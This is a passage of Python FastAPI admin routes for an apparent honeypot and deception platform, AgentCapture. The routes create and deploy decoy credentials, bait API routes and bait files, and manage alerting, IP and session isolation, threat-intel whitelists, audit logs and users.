        .where(DecoyDeployment.template_id == template_id)
        .order_by(desc(DecoyDeployment.created_at), desc(DecoyDeployment.id))
    )


def _create_decoy_deployment_record(
    db: Session,
    template: DecoyTemplate,
    *,
    node_id: int | None,
    deployed_host: str = "",
    reuse_stable_path: bool = False,
) -> DecoyDeployment:
    usernames = [
        item.strip() for item in template.username_dictionary.split(",") if item.strip()
    ] or ["root"]
    username = usernames[0]
    password = secrets.token_urlsafe(max(template.password_length // 2, 8))[
        : template.password_length
    ]
    path_token = secrets.token_hex(12)
    decoy_type = _normalize_decoy_type(getattr(template, "decoy_type", "credential"))
    if decoy_type == "api_route":
        fetch_path = _normalize_decoy_route(template.route_path or "", template.name)
    elif decoy_type == "credential":
        fetch_path = f"/_bait/credential/{path_token}/login"
    else:
        fetch_path = f"/d/{path_token}/{template.file_name}"
    item = None
    if decoy_type == "api_route" or reuse_stable_path:
        item = db.scalar(select(DecoyDeployment).where(DecoyDeployment.fetch_path == fetch_path))
    if item:
        item.node_id = node_id
        item.deployed_host = deployed_host or item.deployed_host
        item.generated_username = username
        item.generated_password = password
        item.target_endpoint = template.target_service_key
        item.status = "generated"
    else:
        item = DecoyDeployment(
            template_id=template.id,
            node_id=node_id,
            unique_token=secrets.token_hex(16),
            fetch_path=fetch_path,
            deployed_host=deployed_host or None,
            status="generated",
            generated_username=username,
            generated_password=password,
            target_endpoint=template.target_service_key,
        )
    db.add(item)
    db.flush()
    return item


def _ensure_bound_file_chain(
    db: Session, template: DecoyTemplate, *, node_id: int | None, deployed_host: str
) -> list[DecoyDeployment]:
    created: list[DecoyDeployment] = []
    for bound_id in [template.bind_route_template_id, template.bind_credential_template_id]:
        if not bound_id:
            continue
        bound_template = db.get(DecoyTemplate, bound_id)
        if not bound_template:
            continue
        deployment = _latest_decoy_deployment(db, bound_template.id)
        if not deployment:
            deployment = _create_decoy_deployment_record(
                db, bound_template, node_id=node_id, deployed_host=deployed_host
            )
        created.append(deployment)
    return created


def _deployment_delivery_snippets(
    deployment: DecoyDeployment, template: DecoyTemplate | None
) -> dict:
    decoy_type = _normalize_decoy_type(
        getattr(template, "decoy_type", "credential") if template else "file"
    )
    path = deployment.fetch_path
    if decoy_type == "api_route":
        return {
            "primary_label": "JS 投放片段",
            "primary": f'window.__AGENTCAPTURE_BAITS = (window.__AGENTCAPTURE_BAITS || []);\nwindow.__AGENTCAPTURE_BAITS.push("{path}");',
            "secondary_label": "Nginx 反代虚拟路由",
            "secondary": f"location = {path} {{\n    proxy_pass http://agentcapture:4877{path};\n    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n}}",
        }
    if decoy_type == "credential":
        username = deployment.generated_username.replace("'", "''")
        password = deployment.generated_password.replace("'", "''")
        service = (deployment.target_endpoint or "web-admin").replace("'", "''")
        return {
            "primary_label": "凭证投放 SQL",
            "primary": f"INSERT INTO decoy_accounts(username, password, service, note) VALUES ('{username}', '{password}', '{service}', 'AgentCapture credential decoy');",
            "secondary_label": "Web 后台登录页",
            "secondary": path,
        }
    return {
        "primary_label": "文件下载链接",
        "primary": path,
        "secondary_label": "文档/配置投放建议",
        "secondary": "将该文件链接或内容投放到配置包、用户手册、备份目录索引中；下载会触发告警并串联绑定的 API 路由/凭证链路。",
    }


def _deployment_view_rows(
    deployments: list[DecoyDeployment], template_lookup: dict[int, DecoyTemplate]
) -> list[dict]:
    rows = []
    for dep in deployments:
        template = template_lookup.get(dep.template_id) if dep.template_id else None
        decoy_type = _normalize_decoy_type(
            getattr(template, "decoy_type", "file") if template else "file"
        )
        rows.append(
            {
                "item": dep,
                "template": template,
                "decoy_type": decoy_type,
                "type_label": _decoy_type_label(decoy_type),
                "snippets": _deployment_delivery_snippets(dep, template),
            }
        )
    return rows


@router.get("/admin/decoy-management", response_class=HTMLResponse)
def admin_decoy_management(request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    templates_list = db.scalars(select(DecoyTemplate).order_by(DecoyTemplate.name)).all()
    deployments = db.scalars(
        select(DecoyDeployment).order_by(desc(DecoyDeployment.created_at))
    ).all()
    nodes = db.scalars(select(Node).order_by(Node.name)).all()
    service_catalog = db.scalars(
        select(ServiceCatalog).order_by(ServiceCatalog.category, ServiceCatalog.default_port)
    ).all()
    decoy_groups = {key: [] for key in DECOY_TYPE_LABELS}
    template_lookup = {item.id: item for item in templates_list}
    for item in templates_list:
        item.decoy_type = _normalize_decoy_type(getattr(item, "decoy_type", "credential"))
        item.type_label = _decoy_type_label(item.decoy_type)
        item.meta = _decoy_template_meta(item)
        item.bound_route_name = (
            template_lookup.get(item.bind_route_template_id).name
            if item.bind_route_template_id
            else ""
        )
        item.bound_credential_name = (
            template_lookup.get(item.bind_credential_template_id).name
            if item.bind_credential_template_id
            else ""
        )
        decoy_groups.setdefault(item.decoy_type, []).append(item)
    deployment_rows = _deployment_view_rows(deployments, template_lookup)
    return _render(
        request,
        "admin/decoys.html",
        {
            "title": "蜜饵管理",
            "current_user": user,
            "templates_list": templates_list,
            "deployments": deployments,
            "deployment_rows": deployment_rows,
            "nodes": nodes,
            "service_catalog": service_catalog,
            "decoy_groups": decoy_groups,
            "decoy_type_labels": DECOY_TYPE_LABELS,
            "nav_base": "/admin/decoy-management",
        },
    )


@router.post("/admin/decoys/deploy-default-chain")
def deploy_default_decoy_chain(
    request: Request,
    deployed_host: str = Form("default-chain"),
    node_id: int | None = Form(None),
    return_to: str = Form("/admin/decoy-management"),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    template = db.scalar(select(DecoyTemplate).where(DecoyTemplate.name == "默认攻击链路文件蜜饵"))
    if not template:
        template = db.scalar(
            select(DecoyTemplate)
            .where(DecoyTemplate.decoy_type == "file")
            .order_by(DecoyTemplate.id.asc())
        )
    if not template:
        raise HTTPException(status_code=404, detail="default chain template not found")
    item = _create_decoy_deployment_record(
        db, template, node_id=node_id, deployed_host=deployed_host or "default-chain"
    )
    bound_deployments = _ensure_bound_file_chain(
        db, template, node_id=node_id, deployed_host=deployed_host or "default-chain"
    )
    db.commit()
    db.refresh(item)
    log_execution(
        db,
        actor_username=user.username,
        action="deploy-default-chain",
        module="decoys",
        target_type="deployment",
        target_ref=item.fetch_path,
        detail_json={
            "template": template.name,
            "bound_paths": [dep.fetch_path for dep in bound_deployments],
        },
    )
    return _redirect(return_to or "/admin/decoy-management")


@router.post("/admin/decoys/templates")
async def create_decoy_template(
    request: Request,
    name: str = Form(...),
    decoy_type: str = Form("credential"),
    file_name: str = Form(""),
    route_path: str = Form(""),
    target_service_key: str = Form("web"),
    password_length: int = Form(16),
    username_dictionary: str = Form("root,admin"),
    exposure_channel: str = Form("manual"),
    bind_route_template_id: int | None = Form(None),
    bind_credential_template_id: int | None = Form(None),
    description: str = Form(""),
    content_template: str = Form(""),
    uploaded_file: UploadFile | None = File(None),
    return_to: str = Form("/admin/decoy-management"),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    decoy_type = _normalize_decoy_type(decoy_type)
    route_path = (
        _normalize_decoy_route(route_path, name)
        if decoy_type == "api_route"
        else (route_path or "")
    )
    if decoy_type == "api_route":
        file_name = file_name or route_path.rsplit("/", 1)[-1] or "api-route"
        content_template = content_template or '{"code": 404, "message": "not found"}'
        target_service_key = "web-api-route"
    elif decoy_type == "credential":
        file_name = file_name or f"{name}.credential"
        content_template = content_template or "$username$ / $password$ @ $honeypot$"
    else:
        upload_meta, uploaded_raw = await _save_decoy_file_upload(uploaded_file)
        file_name = file_name or upload_meta.get("uploaded_file_name") or f"{name}.txt"
        if uploaded_raw and not content_template.strip() and upload_meta.get("is_text"):
            content_template = uploaded_raw[: 512 * 1024].decode("utf-8", errors="replace")
        elif uploaded_raw and not content_template.strip():
            content_template = ""
        content_template = (
            content_template
            if content_template.strip() or uploaded_raw
            else "This document is monitored by AgentCapture.\n$username$:$password$@$honeypot$\n"
        )
        target_service_key = target_service_key or "file-decoy"
    item = DecoyTemplate(
        name=name.strip(),
        file_name=file_name.strip(),
        target_service_key=target_service_key.strip() or "web",
        password_length=max(8, min(int(password_length or 16), 64)),
        username_dictionary=username_dictionary.strip() or "root,admin",
        description=description.strip(),
        content_template=content_template,
        decoy_type=decoy_type,
        route_path=route_path,
        exposure_channel=exposure_channel.strip() or "manual",
        bind_route_template_id=bind_route_template_id,
        bind_credential_template_id=bind_credential_template_id,
        metadata_json={
            "type_label": _decoy_type_label(decoy_type),
            "trigger_logic": "access"
            if decoy_type == "api_route"
            else ("credential_login" if decoy_type == "credential" else "download"),
            **(
                upload_meta
                if decoy_type == "file"
                else {
                    "uploaded_file_name": uploaded_file.filename
                    if uploaded_file and uploaded_file.filename
                    else ""
                }
            ),
        },
    )
    db.add(item)
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action="create",
        module="decoys",
        target_type=decoy_type,
        target_ref=name,
    )
    return _redirect(return_to or "/admin/decoy-management")


@router.post("/admin/decoys/templates/{template_id}/update")
def update_decoy_template(
    template_id: int,
    request: Request,
    name: str = Form(...),
    file_name: str = Form(""),
    route_path: str = Form(""),
    target_service_key: str = Form("web"),
    password_length: int = Form(16),
    username_dictionary: str = Form("root,admin"),
    exposure_channel: str = Form("manual"),
    bind_route_template_id: int | None = Form(None),
    bind_credential_template_id: int | None = Form(None),
    description: str = Form(""),
    content_template: str = Form(""),
    return_to: str = Form("/admin/decoy-management"),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    item = db.get(DecoyTemplate, template_id)
    if not item:
        raise HTTPException(status_code=404)
    decoy_type = _normalize_decoy_type(getattr(item, "decoy_type", "credential"))
    item.name = name.strip() or item.name
    item.file_name = (file_name or item.file_name or item.name).strip()
    item.route_path = (
        _normalize_decoy_route(route_path, item.name)
        if decoy_type == "api_route"
        else (route_path or "")
    )
    item.target_service_key = (target_service_key or item.target_service_key or "web").strip()
    item.password_length = max(8, min(int(password_length or item.password_length or 16), 64))
    item.username_dictionary = (username_dictionary or "root,admin").strip()
    item.exposure_channel = (exposure_channel or "manual").strip()
    item.bind_route_template_id = bind_route_template_id
    item.bind_credential_template_id = bind_credential_template_id
    item.description = description.strip()
    if content_template.strip():
        item.content_template = content_template
    db.add(item)
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action="update",
        module="decoys",
        target_type=decoy_type,
        target_ref=item.name,
    )
    return _redirect(return_to or "/admin/decoy-management")


@router.post("/admin/decoys/templates/{template_id}/deploy")
def deploy_decoy(
    template_id: int,
    request: Request,
    node_id: int | None = Form(None),
    deployed_host: str = Form(""),
    return_to: str = Form("/admin/decoy-management"),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    template = db.get(DecoyTemplate, template_id)
    if not template:
        raise HTTPException(status_code=404)
    decoy_type = _normalize_decoy_type(getattr(template, "decoy_type", "credential"))
    item = _create_decoy_deployment_record(
        db, template, node_id=node_id, deployed_host=deployed_host
    )
    bound_deployments = (
        _ensure_bound_file_chain(db, template, node_id=node_id, deployed_host=deployed_host or "")
        if decoy_type == "file"
        else []
    )
    db.commit()
    db.refresh(item)
    log_execution(
        db,
        actor_username=user.username,
        action="deploy",
        module="decoys",
        target_type="deployment",
        target_ref=item.fetch_path,
        detail_json={
            "decoy_type": decoy_type,
            "bound_paths": [dep.fetch_path for dep in bound_deployments],
        },
    )
    return _redirect(return_to or "/admin/decoy-management")


@router.get("/admin/decoys/deployments/{deployment_id}/manifest.json")
def decoy_deployment_manifest(
    deployment_id: int,
    request: Request,
    db: Session = Depends(get_db),
):
    _require_user(request, db)
    deployment = db.get(DecoyDeployment, deployment_id)
    if not deployment:
        raise HTTPException(status_code=404)
    template = db.get(DecoyTemplate, deployment.template_id) if deployment.template_id else None
    template_lookup = {template.id: template} if template else {}
    row = _deployment_view_rows([deployment], template_lookup)[0]
    bound_route = (
        _latest_decoy_deployment(db, template.bind_route_template_id)
        if template and template.bind_route_template_id
        else None
    )
    bound_credential = (
        _latest_decoy_deployment(db, template.bind_credential_template_id)
        if template and template.bind_credential_template_id
        else None
    )
    payload = {
        "deployment_id": deployment.id,
        "template_id": deployment.template_id,
        "template_name": template.name if template else "",
        "decoy_type": row["decoy_type"],
        "type_label": row["type_label"],
        "fetch_path": deployment.fetch_path,
        "target_endpoint": deployment.target_endpoint,
        "deployed_host": deployment.deployed_host,
        "status": deployment.status,
        "generated_username": deployment.generated_username,
        "generated_password": deployment.generated_password,
        "snippets": row["snippets"],
        "bindings": {
            "api_route": bound_route.fetch_path if bound_route else "",
            "credential_login": bound_credential.fetch_path if bound_credential else "",
            "credential_username": bound_credential.generated_username if bound_credential else "",
            "credential_password": bound_credential.generated_password if bound_credential else "",
        },
        "template_metadata": _decoy_template_meta(template) if template else {},
    }
    return Response(
        content=json.dumps(payload, ensure_ascii=False, indent=2, default=str),
        media_type="application/json; charset=utf-8",
        headers={
            "Content-Disposition": f'attachment; filename="decoy-deployment-{deployment.id}.manifest.json"'
        },
    )


@router.post("/admin/decoys/templates/{template_id}/delete")
def delete_decoy_template(
    template_id: int,
    request: Request,
    return_to: str = Form("/admin/decoy-management"),
    db: Session = Depends(get_db),
):
    _require_admin(request, db)
    item = db.get(DecoyTemplate, template_id)
    if not item:
        return _redirect(return_to or "/admin/decoy-management")
    return _queue_sensitive_action(
        request,
        action="delete_decoy_template",
        params={"template_id": template_id},
        return_to=return_to or "/admin/decoy-management",
        title=f"删除蜜饵模板：{item.name}",
        description="删除后无法继续从该模板生成新的蜜饵分发记录，请输入管理员密码确认。",
    )


@router.get("/admin/alerts", response_class=HTMLResponse)
def admin_alerts(request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    channels = db.scalars(select(AlertChannel).order_by(AlertChannel.name)).all()
    policies = db.scalars(select(AlertPolicy).order_by(AlertPolicy.name)).all()
    # Active isolation verdicts (risk_engine isolate / canary echo / manual)
    # surfaced next to alerting so an operator can see and revoke live blocks.
    from app.services.isolation import list_active_isolations

    isolations = list_active_isolations(db, limit=50)
    edit_channel_id = request.query_params.get("edit_channel")
    if edit_channel_id:
        try:
            edit_channel_id = int(edit_channel_id)
        except (TypeError, ValueError):
            edit_channel_id = None
    edit_policy_id = request.query_params.get("edit_policy")
    if edit_policy_id:
        try:
            edit_policy_id = int(edit_policy_id)
        except (TypeError, ValueError):
            edit_policy_id = None
    return _render(
        request,
        "admin/alerts.html",
        {
            "title": "告警配置",
            "current_user": user,
            "channels": channels,
            "policies": policies,
            "isolations": isolations,
            "alerts_enabled": get_settings().alerts_enabled,
            "edit_channel_id": edit_channel_id,
            "edit_policy_id": edit_policy_id,
            "error": request.query_params.get("error", ""),
        },
    )


@router.post("/admin/isolation/{entry_id}/revoke")
def revoke_isolation_entry(entry_id: int, request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    from app.services.isolation import revoke_isolation

    ok = revoke_isolation(db, int(entry_id))
    if ok:
        log_execution(
            db,
            actor_username=user.username,
            action="revoke",
            module="isolation",
            target_type="entry",
            target_ref=str(entry_id),
        )
    return _redirect("/admin/alerts")


@router.get("/admin/isolation")
def admin_isolation_redirect():
    """Isolation management lives inside the alerts page; GET lands there."""
    return _redirect("/admin/alerts")


@router.post("/admin/isolation")
def create_isolation_entry(
    request: Request,
    kind: str = Form("ip"),
    value: str = Form(...),
    reason: str = Form("manual"),
    ttl_minutes: int = Form(60),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    from app.services.isolation import isolate_target

    if kind not in ("ip", "session"):
        return _redirect("/admin/alerts" + _qs(error="隔离对象类型必须是 ip 或 session"))
    try:
        isolate_target(
            db,
            kind=kind,
            value=value.strip()[:128],
            reason=reason or "manual",
            ttl_minutes=max(1, int(ttl_minutes)),
            created_by=user.username,
        )
    except ValueError:
        return _redirect("/admin/alerts" + _qs(error="隔离值不能为空"))
    log_execution(
        db,
        actor_username=user.username,
        action="create",
        module="isolation",
        target_type=kind,
        target_ref=value,
    )
    return _redirect("/admin/alerts")


@router.post("/admin/alerts/channels")
def create_alert_channel(
    request: Request,
    name: str = Form(...),
    channel_type: str = Form(...),
    description: str = Form(""),
    config_json: str = Form("{}"),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    existing = db.scalar(select(AlertChannel).where(AlertChannel.name == name))
    if existing:
        return _redirect("/admin/alerts" + _qs(error=f"通道名称 '{name}' 已存在"))
    item = AlertChannel(
        name=name,
        channel_type=channel_type,
        description=description,
        config_json=_parse_json(config_json, {}),
    )
    db.add(item)
    db.commit()
    _invalidate_alert_dispatcher_cache()
    log_execution(
        db,
        actor_username=user.username,
        action="create",
        module="alerts",
        target_type="channel",
        target_ref=name,
    )
    return _redirect("/admin/alerts")


@router.post("/admin/alerts/channels/{channel_id}/toggle")
def toggle_alert_channel(
    channel_id: int,
    request: Request,
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    item = db.get(AlertChannel, channel_id)
    if not item:
        return _redirect("/admin/alerts")
    item.is_active = not item.is_active
    db.add(item)
    db.commit()
    _invalidate_alert_dispatcher_cache()
    log_execution(
        db,
        actor_username=user.username,
        action="toggle",
        module="alerts",
        target_type="channel",
        target_ref=item.name,
    )
    return _redirect("/admin/alerts")


@router.post("/admin/alerts/channels/{channel_id}/patch")
def patch_alert_channel(
    channel_id: int,
    request: Request,
    name: str = Form(...),
    description: str = Form(""),
    config_json: str = Form("{}"),
    is_active: str = Form(""),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    item = db.get(AlertChannel, channel_id)
    if not item:
        return _redirect("/admin/alerts")
    # check name uniqueness if changed
    if name != item.name:
        existing = db.scalar(
            select(AlertChannel).where(AlertChannel.name == name, AlertChannel.id != channel_id)
        )
        if existing:
            return _redirect("/admin/alerts")
    item.name = name
    item.description = description
    item.config_json = _parse_json(config_json, {})
    item.is_active = is_active == "on" or is_active == "true"
    db.add(item)
    db.commit()
    _invalidate_alert_dispatcher_cache()
    log_execution(
        db,
        actor_username=user.username,
        action="update",
        module="alerts",
        target_type="channel",
        target_ref=name,
    )
    return _redirect("/admin/alerts")


@router.post("/admin/alerts/policies/{policy_id}/toggle")
def toggle_alert_policy(
    policy_id: int,
    request: Request,
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    item = db.get(AlertPolicy, policy_id)
    if not item:
        return _redirect("/admin/alerts")
    item.is_active = not item.is_active
    db.add(item)
    db.commit()
    _invalidate_alert_dispatcher_cache()
    log_execution(
        db,
        actor_username=user.username,
        action="toggle",
        module="alerts",
        target_type="policy",
        target_ref=item.name,
    )
    return _redirect("/admin/alerts")


@router.post("/admin/alerts/policies/{policy_id}/patch")
def patch_alert_policy(
    policy_id: int,
    request: Request,
    name: str = Form(...),
    event_scope: str = Form(...),
    min_risk_score: int = Form(...),
    channels_csv: str = Form(""),
    is_active: str = Form(""),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    item = db.get(AlertPolicy, policy_id)
    if not item:
        return _redirect("/admin/alerts")
    if name != item.name:
        existing = db.scalar(
            select(AlertPolicy).where(AlertPolicy.name == name, AlertPolicy.id != policy_id)
        )
        if existing:
            return _redirect("/admin/alerts")
    if event_scope not in ("threat", "credential", "system"):
        return _redirect("/admin/alerts")
    channels_list = [s.strip() for s in channels_csv.split(",") if s.strip()]
    item.name = name
    item.event_scope = event_scope
    item.min_risk_score = min_risk_score
    item.delivery_channels_json = channels_list
    item.is_active = is_active == "on" or is_active == "true"
    db.add(item)
    db.commit()
    _invalidate_alert_dispatcher_cache()
    log_execution(
        db,
        actor_username=user.username,
        action="update",
        module="alerts",
        target_type="policy",
        target_ref=name,
    )
    return _redirect("/admin/alerts")


@router.post("/admin/alerts/test")
def test_alert_channel(
    request: Request,
    channel_id: int = Form(...),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    channel = db.get(AlertChannel, channel_id)
    if not channel:
        return _redirect("/admin/alerts")
    from app.services.alert_dispatcher import AlertPayload, get_alert_dispatcher
    from datetime import datetime, timezone

    payload = AlertPayload(
        event_type="test_alert",
        source_ip="127.0.0.1",
        decision="block",
        risk_score=100,
        signals=["test"],
        path="/test/alert",
        method="GET",
        summary="This is a test alert from admin UI",
        timestamp=datetime.now(timezone.utc),
    )
    try:
        result = get_alert_dispatcher().dispatch_channel_sync(channel, payload)
        test_result = f"测试发送完成: {result}"
    except Exception as e:
        test_result = f"测试失败: {e}"
    channels = db.scalars(select(AlertChannel).order_by(AlertChannel.name)).all()
    policies = db.scalars(select(AlertPolicy).order_by(AlertPolicy.name)).all()
    return _render(
        request,
        "admin/alerts.html",
        {
            "title": "告警配置",
            "current_user": user,
            "channels": channels,
            "policies": policies,
            "alerts_enabled": get_settings().alerts_enabled,
            "test_result": test_result,
            "edit_channel_id": None,
            "edit_policy_id": None,
        },
    )


@router.post("/admin/alerts/policies")
def create_alert_policy(
    request: Request,
    name: str = Form(...),
    event_scope: str = Form(...),
    min_risk_score: int = Form(...),
    channels_csv: str = Form(""),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    item = AlertPolicy(
        name=name,
        event_scope=event_scope,
        min_risk_score=min_risk_score,
        delivery_channels_json=[part.strip() for part in channels_csv.split(",") if part.strip()],
    )
    db.add(item)
    db.commit()
    _invalidate_alert_dispatcher_cache()
    log_execution(
        db,
        actor_username=user.username,
        action="create",
        module="alerts",
        target_type="policy",
        target_ref=name,
    )
    return _redirect("/admin/alerts")


@router.post("/admin/alerts/channels/{channel_id}/delete")
def delete_alert_channel(channel_id: int, request: Request, db: Session = Depends(get_db)):
    _require_admin(request, db)
    item = db.get(AlertChannel, channel_id)
    if not item:
        return _redirect("/admin/alerts")
    return _queue_sensitive_action(
        request,
        action="delete_alert_channel",
        params={"channel_id": channel_id},
        return_to="/admin/alerts",
        title=f"删除通知配置：{item.name}",
        description="通知配置删除后，关联策略将失去该发送目标，请输入管理员密码确认。",
    )


@router.post("/admin/alerts/policies/{policy_id}/delete")
def delete_alert_policy(policy_id: int, request: Request, db: Session = Depends(get_db)):
    _require_admin(request, db)
    item = db.get(AlertPolicy, policy_id)
    if not item:
        return _redirect("/admin/alerts")
    return _queue_sensitive_action(
        request,
        action="delete_alert_policy",
        params={"policy_id": policy_id},
        return_to="/admin/alerts",
        title=f"删除告警策略：{item.name}",
        description="删除后该策略将停止生效，请输入管理员密码确认。",
    )


@router.get("/admin/intel", response_class=HTMLResponse)
def admin_intel(request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    return _render(
        request,
        "admin/intel.html",
        {
            "title": "情报与白名单",
            "current_user": user,
            "items": list_intel_entries(db),
            "stats": intel_stats(db),
        },
    )


@router.post("/admin/intel")
def create_intel_entry(
    request: Request,
    entry_type: str = Form(...),
    value: str = Form(...),
    label: str = Form(""),
    source: str = Form("manual"),
    description: str = Form(""),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    item = ThreatIntelEntry(
        entry_type=entry_type, value=value, label=label, source=source, description=description
    )
    db.add(item)
    db.commit()
    _invalidate_whitelist_cache()
    log_execution(
        db,
        actor_username=user.username,
        action="create",
        module="intel",
        target_type="entry",
        target_ref=value,
    )
    return _redirect("/admin/intel")


@router.post("/admin/intel/{entry_id}/delete")
def delete_intel_entry(entry_id: int, request: Request, db: Session = Depends(get_db)):
    _require_admin(request, db)
    item = db.get(ThreatIntelEntry, entry_id)
    if not item:
        return _redirect("/admin/intel")
    return _queue_sensitive_action(
        request,
        action="delete_intel_entry",
        params={"entry_id": entry_id},
        return_to="/admin/intel",
        title=f"删除情报条目：{item.value}",
        description="删除后该白名单/情报信息将立即失效，请输入管理员密码确认。",
    )


@router.get("/admin/execution-history", response_class=HTMLResponse)
def admin_execution_history(
    request: Request,
    date_from: str = "",
    date_to: str = "",
    actor_username: str = "",
    module: str = "",
    status: str = "",
    db: Session = Depends(get_db),
):
    user = _require_user(request, db)
    start = _parse_admin_datetime(date_from)
    end = _parse_admin_datetime(date_to, end_of_day=True)
    items = filter_execution_history(
        db,
        date_from=start,
        date_to=end,
        actor_username=actor_username,
        module=module,
        status=status,
        limit=200,
    )
    return _render(
        request,
        "admin/execution_history.html",
        {
            "title": "执行历史",
            "current_user": user,
            "items": items,
            "filters": {
                "date_from": date_from,
                "date_to": date_to,
                "actor_username": actor_username,
                "module": module,
                "status": status,
            },
            "export_href": "/admin/execution-history/export.csv"
            + _qs(
                date_from=date_from or None,
                date_to=date_to or None,
                actor_username=actor_username or None,
                module=module or None,
                status=status or None,
            ),
        },
    )


@router.get("/admin/execution-history/export.csv")
def admin_execution_history_export(
    request: Request,
    date_from: str = "",
    date_to: str = "",
    actor_username: str = "",
    module: str = "",
    status: str = "",
    db: Session = Depends(get_db),
):
    _require_user(request, db)
    start = _parse_admin_datetime(date_from)
    end = _parse_admin_datetime(date_to, end_of_day=True)
    items = filter_execution_history(
        db,
        date_from=start,
        date_to=end,
        actor_username=actor_username,
        module=module,
        status=status,
        limit=2000,
    )
    rows = [
        {
            "created_at": item.created_at.isoformat(),
            "actor_username": item.actor_username,
            "module": item.module,
            "action": item.action,
            "target_type": item.target_type,
            "target_ref": item.target_ref,
            "status": item.status,
            "detail_json": json.dumps(item.detail_json or {}, ensure_ascii=False),
        }
        for item in items
    ]
    return _csv_response("execution_history.csv", rows)


@router.get("/admin/login-logs", response_class=HTMLResponse)
def admin_login_logs(
    request: Request,
    date_from: str = "",
    date_to: str = "",
    username: str = "",
    login_status: str = "",
    ip_address: str = "",
    db: Session = Depends(get_db),
):
    user = _require_user(request, db)
    start = _parse_admin_datetime(date_from)
    end = _parse_admin_datetime(date_to, end_of_day=True)
    items = filter_login_logs(
        db,
        date_from=start,
        date_to=end,
        username=username,
        login_status=login_status,
        ip_address=ip_address,
        limit=200,
    )
    stats = {
        "total": int(db.scalar(select(func.count()).select_from(LoginLog)) or 0),
        "success": int(
            db.scalar(
                select(func.count()).select_from(LoginLog).where(LoginLog.login_status == "success")
            )
            or 0
        ),
        "failed": int(
            db.scalar(
                select(func.count()).select_from(LoginLog).where(LoginLog.login_status == "failed")
            )
            or 0
        ),
    }
    return _render(
        request,
        "admin/login_logs.html",
        {
            "title": "登录日志",
            "current_user": user,
            "items": items,
            "stats": stats,
            "filters": {
                "date_from": date_from,
                "date_to": date_to,
                "username": username,
                "login_status": login_status,
                "ip_address": ip_address,
            },
            "export_href": "/admin/login-logs/export.csv"
            + _qs(
                date_from=date_from or None,
                date_to=date_to or None,
                username=username or None,
                login_status=login_status or None,
                ip_address=ip_address or None,
            ),
        },
    )


@router.get("/admin/login-logs/export.csv")
def admin_login_logs_export(
    request: Request,
    date_from: str = "",
    date_to: str = "",
    username: str = "",
    login_status: str = "",
    ip_address: str = "",
    db: Session = Depends(get_db),
):
    _require_user(request, db)
    start = _parse_admin_datetime(date_from)
    end = _parse_admin_datetime(date_to, end_of_day=True)
    items = filter_login_logs(
        db,
        date_from=start,
        date_to=end,
        username=username,
        login_status=login_status,
        ip_address=ip_address,
        limit=2000,
    )
    rows = [
        {
            "created_at": item.created_at.isoformat(),
            "username": item.username,
            "login_status": item.login_status,
            "ip_address": item.ip_address or "",
            "fail_reason": item.fail_reason or "",
            "user_agent": item.user_agent or "",
            "device_type": item.device_type or "",
            "browser": item.browser or "",
            "os_name": item.os_name or "",
            "location": item.location or "",
        }
        for item in items
    ]
    return _csv_response("login_logs.csv", rows)


@router.post("/admin/login-logs/cleanup")
def cleanup_login_logs(request: Request, db: Session = Depends(get_db)):
    _require_admin(request, db)
    return _queue_sensitive_action(
        request,
        action="cleanup_login_logs",
        params={},
        return_to="/admin/login-logs",
        title="清空登录日志",
        description="该操作会删除所有登录审计记录且无法恢复，请输入管理员密码确认。",
    )


@router.get("/admin/users", response_class=HTMLResponse)
def admin_users(request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    items = db.scalars(select(User).order_by(User.username)).all()
    return _render(
        request, "admin/users.html", {"title": "用户管理", "current_user": user, "items": items}
    )


@router.post("/admin/users")
def create_user(
    request: Request,
    username: str = Form(...),
    password: str = Form(...),
    role: str = Form("operator"),
    name: str = Form(""),
    email: str = Form(""),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    item = User(
        username=username, password_hash=hash_password(password), role=role, name=name, email=email
    )
    db.add(item)
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action="create",
        module="users",
        target_type="user",
        target_ref=username,
    )
    return _redirect("/admin/users")


@router.post("/admin/users/{user_id}/delete")
def delete_user(user_id: int, request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    item = db.get(User, user_id)
    if not item or item.username == user.username:
        return _redirect("/admin/users")
    return _queue_sensitive_action(
        request,
        action="delete_user",
        params={"user_id": user_id},
        return_to="/admin/users",
        title=f"删除用户：{item.username}",
        description="删除用户后无法恢复其本地账号，请输入管理员密码确认。",
    )


@router.post("/admin/users/{user_id}/reset-password")
def reset_user_password(
    user_id: int,
    request: Request,
    new_password: str = Form(...),
    db: Session = Depends(get_db),
):
    _require_admin(request, db)
    item = db.get(User, user_id)
    if not item:
        return _redirect("/admin/users")
    return _queue_sensitive_action(
        request,
        action="reset_user_password",
        params={"user_id": user_id, "new_password": new_password},
        return_to="/admin/users",
        title=f"重置密码：{item.username}",
        description="该操作会立即重置目标用户密码，请输入管理员密码确认。",
    )


@router.get("/admin/profile", response_class=HTMLResponse)
def admin_profile(request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    from app.core.config import get_settings as _gs

    return _render(
        request,
        "admin/profile.html",
        {
            "title": "系统设置",
            "current_user": user,
            "settings_port": _gs().port,
            "saved": request.query_params.get("saved", ""),
            "path_error": request.query_params.get("path_error", ""),
        },
    )


@router.post("/admin/profile/access-path")
async def admin_profile_access_path(
    request: Request,
    db: Session = Depends(get_db),
):
